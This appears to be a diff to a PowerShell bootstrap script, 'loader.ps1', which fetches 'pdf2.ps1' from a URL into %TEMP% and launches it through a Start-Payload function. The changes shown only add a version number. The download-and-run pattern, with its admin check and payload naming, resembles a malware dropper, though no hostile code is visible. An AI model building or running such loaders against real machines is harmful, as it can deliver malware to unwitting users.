@@ -1,5 +1,6 @@
 # =============================================================================
 # loader.ps1 - robust bootstrap for pdf2.ps1 (Windows PowerShell 5.1+)
+# Version: 1.2
 #
 # What it does, in order:
 #   1. Forces TLS 1.2 (stock Win10/Win11 PowerShell 5.1 compatible).
@@ -31,6 +32,7 @@ param(
 )
 
 $ErrorActionPreference = 'Continue'
+$script:LoaderVersion = '1.2'
 
 # ----------------------------- logging ---------------------------------------
 $logDir = $env:TEMP
@@ -205,7 +207,7 @@ function Start-Payload {
 
 # ------------------------------- main ----------------------------------------
 $isAdmin = Test-Admin
-Write-Log ('loader start | admin={0} | url={1} | retries={2} | timeout={3}s' -f $isAdmin, $Url, $Retries, $TimeoutSec)
+Write-Log ('loader v{0} start | admin={1} | url={2} | retries={3} | timeout={4}s' -f $script:LoaderVersion, $isAdmin, $Url, $Retries, $TimeoutSec)
 
 # Resolve default destination: %TEMP%\<basename> (no admin needed, unlike C:\).
 if (-not $OutFile) {
